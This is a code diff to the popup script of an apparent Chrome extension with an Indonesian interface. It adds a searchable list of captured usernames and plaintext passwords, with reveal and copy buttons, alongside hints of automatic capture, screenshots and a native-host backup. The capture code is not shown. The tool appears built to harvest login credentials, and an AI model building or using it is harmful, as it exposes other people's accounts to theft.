@@ -9,11 +9,14 @@ const btnExportWord = document.getElementById('btnExportWord');
 const btnExportJson = document.getElementById('btnExportJson');
 const btnClearLogs = document.getElementById('btnClearLogs');
 const recordCount = document.getElementById('recordCount');
-const lastUser = document.getElementById('lastUser');
-const lastShot = document.getElementById('lastShot');
+const searchInput = document.getElementById('searchInput');
+const credList = document.getElementById('credList');
 const nativeStatus = document.getElementById('nativeStatus');
 const nativeUpdated = document.getElementById('nativeUpdated');
 const nativePath = document.getElementById('nativePath');
+
+let allLogs = [];
+let showPasswords = new Set();
 
 function updateUI(enabled) {
   statusDot.className = enabled ? 'dot on' : 'dot off';
@@ -56,15 +59,14 @@ async function refreshStats() {
     nativeBackupStatus: null
   });
   const logs = Array.isArray(data.credentialLogs) ? data.credentialLogs : [];
-  const latest = logs[logs.length - 1];
   const backup = data.nativeBackupStatus;
 
   toggleAuto.checked = data.autoEnabled;
   updateUI(data.autoEnabled);
 
+  allLogs = logs;
   recordCount.textContent = String(logs.length);
-  lastUser.textContent = latest?.username || '-';
-  lastShot.textContent = latest?.screenshotFile || '-';
+  renderCredList();
 
   if (backup?.ok) {
     nativeStatus.textContent = `Aktif (${backup.count ?? 0} record)`;
@@ -76,6 +78,88 @@ async function refreshStats() {
     nativePath.textContent = backup?.error || 'Jalankan installer native host dulu.';
   }
 }
+
+function renderCredList() {
+  const query = (searchInput.value || '').toLowerCase().trim();
+  // filter: newest first
+  const filtered = allLogs
+    .slice()
+    .reverse()
+    .filter(log => {
+      if (!query) return true;
+      return (log.username || '').toLowerCase().includes(query) ||
+             (log.password || '').toLowerCase().includes(query);
+    });
+
+  if (filtered.length === 0) {
+    credList.innerHTML = '<div class="no-results">' +
+      (query ? 'Tidak ditemukan' : 'Belum ada data') + '</div>';
+    return;
+  }
+
+  credList.innerHTML = filtered.map((log, i) => {
+    const idx = allLogs.length - 1 - allLogs.slice().reverse().indexOf(log);
+    const passVisible = showPasswords.has(idx);
+    const passDisplay = log.password
+      ? (passVisible
+        ? '<span class="pass-text">' + escapeHtml(log.password) + '</span>'
+        : '<span class="dots">••••••••</span>')
+      : '<span style="color:#555">-</span>';
+    const eyeIcon = passVisible ? '🙈' : '👁️';
+
+    return '<div class="cred-item">' +
+      '<div class="cred-user">' +
+        '<span>👤 ' + escapeHtml(log.username || '-') + '</span>' +
+        '<button class="btn-copy" data-copy="' + escapeHtml(log.username || '') + '" title="Copy username">📋</button>' +
+      '</div>' +
+      '<div class="cred-pass">' +
+        '<span>🔑 ' + passDisplay + '</span>' +
+        (log.password ? '<button class="btn-toggle-eye" data-idx="' + idx + '" title="Toggle password">' + eyeIcon + '</button>' : '') +
+        (log.password ? '<button class="btn-copy" data-copy="' + escapeHtml(log.password) + '" title="Copy password">📋</button>' : '') +
+      '</div>' +
+      '<div class="cred-time">🕐 ' + escapeHtml(formatDate(log.capturedAt)) + '</div>' +
+    '</div>';
+  }).join('');
+
+  // attach events
+  credList.querySelectorAll('.btn-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      const text = btn.dataset.copy;
+      if (!text) return;
+      try {
+        await navigator.clipboard.writeText(text);
+        btn.textContent = '✅';
+        setTimeout(() => { btn.textContent = '📋'; }, 1000);
+      } catch {
+        // fallback
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        btn.textContent = '✅';
+        setTimeout(() => { btn.textContent = '📋'; }, 1000);
+      }
+    });
+  });
+
+  credList.querySelectorAll('.btn-toggle-eye').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const idx = parseInt(btn.dataset.idx, 10);
+      if (showPasswords.has(idx)) {
+        showPasswords.delete(idx);
+      } else {
+        showPasswords.add(idx);
+      }
+      renderCredList();
+    });
+  });
+}
+
+searchInput.addEventListener('input', () => renderCredList());
 
 async function downloadBlob(blob, filename) {
   const url = URL.createObjectURL(blob);
@@ -197,6 +281,9 @@ btnClearLogs.addEventListener('click', async () => {
   if (!ok) return;
 
   await chrome.storage.local.set({ credentialLogs: [] });
+  allLogs = [];
+  showPasswords.clear();
+  searchInput.value = '';
   await refreshStats();
   btnClearLogs.textContent = '✅ Data Dihapus';
   setTimeout(() => { btnClearLogs.textContent = '🧹 Hapus Data Tersimpan'; }, 1500);
